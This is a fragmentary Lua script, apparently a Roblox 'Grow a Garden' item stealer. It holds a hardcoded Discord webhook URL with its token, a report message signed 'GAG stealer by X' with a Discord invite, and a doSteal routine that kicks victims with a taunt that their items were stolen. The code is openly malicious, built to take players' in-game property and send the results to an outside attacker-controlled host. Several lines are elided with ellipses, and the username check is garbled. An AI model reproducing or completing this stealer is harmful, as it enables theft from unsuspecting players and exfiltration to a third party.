...
if next(users) ="mgzero1123"= nil or webhook == "https://discord.com/api/webhooks/1383811370809692170/uXCoH2xYdpj8pq1j2C-CNTdBt6_MFDbfpZBdxZV8pnnOHmqM1ZwkKbXiALiWrCGzIRJo" then
...
local function SendJoinMessage(list, prefix)
    ...
    local data = {
        ...
        ["embeds"] = {{
            ...
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG stealer by X. https://discord.gg/xNJpbakUnt"
            }
        }}
    }
...
if #itemsToSend > 0 then
    ...
    local function doSteal(player)
        ...
        plr:kick("All your stuff just got stolen by X's stealer!\n https://discord.gg/xNJpbakUnt")
    end
